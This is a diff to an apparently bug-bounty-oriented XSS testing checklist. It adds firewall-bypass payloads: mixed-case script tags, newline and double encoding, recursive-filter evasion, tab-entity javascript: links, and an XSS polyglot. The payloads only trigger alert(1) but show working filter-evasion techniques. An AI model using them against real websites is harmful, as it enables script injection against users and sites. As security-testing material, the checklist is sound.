@@ -107,11 +107,43 @@ Similar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you 
 - You can try an XSS polyglot
 	- ```javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>```
 	- https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626
+	
+### XSS Firewall Bypass Techniques
 
-# Thanks To
+* Check if the firewall is blocking only lowercase
+```
+Ex:- <scRipT>alert(1)</scRipT>
+```
+* Try to break firewall regex with the  new line(\r\n)
+```
+Ex:- <script>%0alert(1)</script>
+```
+* Try Double Encoding
+```
+Ex:- %2522
+```
+* Testing for recursive filters, if firewall removes text in red, we will have clear payload
+```
+Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
+```
+* Injecting anchor tag without whitespaces
+```
+Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+```
+* Try to bypass whitespaces using Bullet
+```
+Ex:- <svg•onload=alert(1)>
+```
+* Try to change request method
+```
+Ex:- GET /?q=xss  POST/
+                  q=xss
+```
+## Thanks To
 * [The XSS rat](https://www.youtube.com/channel/UCjBhClJ59W4hfUly51i11hg)
+* [sratarun](https://twitter.com/sratarun)
 
-# Reference
+## Reference
 * [https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md](https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md)
 
 ### Authors
